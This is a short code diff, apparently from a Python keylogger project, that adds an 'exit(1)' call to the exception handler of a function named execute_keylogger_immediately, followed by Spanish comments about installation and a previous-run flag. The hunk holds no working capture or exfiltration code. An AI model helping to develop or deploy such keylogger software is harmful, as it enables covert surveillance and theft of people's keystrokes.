@@ -143,6 +143,7 @@ def execute_keylogger_immediately():
         #print("Keylogger executed immediately.")
     except Exception as e:
         #print(f"Failed to execute the keylogger: {e}")
+        exit(1)
 
 # ---- Instalación ----
 # 1. Verificar si ya se ejecutó previamente (flag)
